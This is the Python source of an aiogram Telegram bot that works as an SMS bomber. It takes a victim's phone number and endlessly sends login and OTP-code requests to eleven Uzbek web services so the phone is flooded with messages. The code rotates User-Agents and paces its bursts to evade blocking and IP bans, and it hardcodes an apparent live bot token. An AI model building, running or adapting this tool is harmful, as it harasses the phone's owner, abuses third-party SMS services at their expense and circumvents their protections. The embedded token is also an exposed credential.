import asyncio
import logging
import httpx
import random
from typing import Dict, List, Optional
from dataclasses import dataclass

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# --- Конфигурация ---
API_TOKEN = '8332267764:AAHbNuigtNW4dc2ZnWBLWizpF5nd-ODJ7S8'
logging.basicConfig(level=logging.INFO)

active_tasks = {}

# Список User-Agents для обхода блокировок
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
]


class BombingStates(StatesGroup):
    waiting_for_phone = State()


@dataclass
class ServiceConfig:
    name: str
    url: str
    method: str
    headers: Dict[str, str]
    json_data: Optional[Dict] = None
    data: Optional[Dict] = None


class SmartSender:
    def __init__(self, phone: str):
        self.phone = phone

    def get_services(self) -> List[ServiceConfig]:
        p = self.phone
        return [
            ServiceConfig('100k.uz', 'https://api.100k.uz/api/auth/sms-login', 'POST', {},
                          json_data={'phone': f'+{p}'}),
            ServiceConfig('alifshop.uz', 'https://gw.alifshop.uz/web/client/auth/request-login', 'POST',
                          {'Service-Token': 'service-token-alifshop'}, json_data={'phone': p}),
            ServiceConfig('uybor.uz', 'https://api.uybor.uz/api/v1/auth/code', 'POST', {},
                          json_data={'phone': f'+{p}'}),
            ServiceConfig('bilgi.uz', 'https://bilgi.uz/local/ajax/common.php', 'POST', {},
                          data={'handler': 'AuthAjaxHandler', 'func': 'sendRegisterFields', 'phone': p}),
            ServiceConfig('brandstore.uz', 'https://api.brandstore.uz/api/auth/code/create/', 'POST',
                          {'Device-Type': 'web'}, json_data={'phone': p}),
            ServiceConfig('dafna.uz', 'https://dafna.uz/api/send-code', 'POST', {}, json_data={'phone': p}),
            ServiceConfig('multibank.uz', 'https://auth.multibank.uz/api/otp-by-phone', 'POST', {},
                          json_data={'phone': p}),
            ServiceConfig('openshop.uz', 'https://web.openshop.uz/api/v1/auth/login-phone', 'POST', {'language': 'uz'},
                          json_data={'phone': p}),
            ServiceConfig('frame.uz', 'https://api.frame.uz/auth/api/v1/authentications', 'POST', {},
                          json_data={'type': 'login', 'method': 'login', 'value': f'+{p}', 'platform': 'web'}),
            ServiceConfig('oqtepalavash.uz', 'https://oqtepalavash.uz/api/sms/Send', 'POST', {},
                          json_data={'phone': p}),
            ServiceConfig('soff.uz', 'https://api.soff.uz/auth/register/', 'POST', {},
                          json_data={'phone_or_email': f'+{p}', 'role': 'customer'}),

        ]

    async def send_request(self, client: httpx.AsyncClient, s: ServiceConfig):
        # Для каждого запроса выбираем новый User-Agent
        headers = {**s.headers, "User-Agent": random.choice(USER_AGENTS)}
        try:
            if s.method == 'POST':
                await client.post(s.url, json=s.json_data, data=s.data, headers=headers, timeout=6)
            else:
                await client.get(s.url, headers=headers, timeout=6)
        except:
            pass


# --- Логика Бота ---

bot = Bot(token=API_TOKEN)
dp = Dispatcher()


def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="🚀 Запустить поток")],
        [KeyboardButton(text="Остановить")]
    ], resize_keyboard=True)


@dp.message(Command("start"))
async def start(m: Message):
    await m.answer("Бот готов к работе.", reply_markup=main_kb())


@dp.message(F.text == "🚀 Запустить поток")
async def ask_phone(m: Message, state: FSMContext):
    await state.set_state(BombingStates.waiting_for_phone)
    await m.answer("Отправьте номер телефона:")


@dp.message(F.text == "Остановить")
async def stop(m: Message):
    uid = m.from_user.id
    if uid in active_tasks:
        active_tasks[uid].cancel()
        del active_tasks[uid]
        await m.answer("🛑 Потоки остановлены.")
    else:
        await m.answer("У вас нет активных процессов.")


@dp.message(BombingStates.waiting_for_phone)
async def start_bomb(m: Message, state: FSMContext):
    phone = m.text.strip().replace('+', '')
    if not phone.isdigit():
        await m.answer("❌ Введите только цифры.")
        return

    await state.clear()
    uid = m.from_user.id
    if uid in active_tasks: active_tasks[uid].cancel()

    task = asyncio.create_task(smart_continuous_sender(phone))
    active_tasks[uid] = task
    await m.answer(f"✅ Непрерывная отправка на {phone} включена.")


async def smart_continuous_sender(phone: str):
    sender = SmartSender(phone)
    services = sender.get_services()

    async with httpx.AsyncClient(verify=False) as client:
        while True:
            # Перемешиваем сервисы, чтобы каждый круг был разным
            random.shuffle(services)

            # Группируем запросы по 3 штуки за раз (баланс скорости и безопасности)
            chunk_size = 3
            for i in range(0, len(services), chunk_size):
                chunk = services[i:i + chunk_size]
                tasks = [sender.send_request(client, s) for s in chunk]
                await asyncio.gather(*tasks)
                # Маленькая пауза между пачками запросов
                await asyncio.sleep(random.uniform(0.3, 0.7))

            logging.info(f"Круг для {phone} завершен")
            # Пауза между кругами (5 секунд) — критически важно, чтобы не забанили IP
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(dp.start_polling(bot))
